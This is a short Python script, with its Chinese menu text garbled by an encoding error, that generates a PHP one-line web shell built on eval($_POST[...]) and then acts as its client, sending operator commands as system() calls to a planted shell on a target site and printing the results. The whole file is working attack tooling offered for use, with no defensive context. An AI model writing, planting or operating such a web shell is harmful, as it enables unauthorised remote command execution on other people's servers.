import requests
import os
print('1)phpһ�仰ľ������   2)����ľ��')
number = input('��ѡ��>')
if number == '':
      print('[-]����')
else:
    if int(number) == 1:
        password = input('ľ������>')
        f = open('shell.txt','w')
        f.write("<?php @eval($_POST['")
        f.write(password)
        f.write("']); ?>")
        f.close()
        os.rename('shell.txt','php.php')
        print('[*]�������')
    else:
        url = input('��ַ>')
        shell = input('ľ��·��>')
        passwd = input('ľ�������>')
        port = input('��վ�˿�(�س�Ĭ��80)>')
        print('[*]������')
        if port == '':
            pass
        while True:
            cmd = input('shell >')

            POST = "system(\'"+ cmd +" \');"
            payload={
                passwd:POST
            }
            url1=url+':'+port+shell
            print(url1)
            response=requests.post(url1,payload,timeout=10)
            print(response.text)

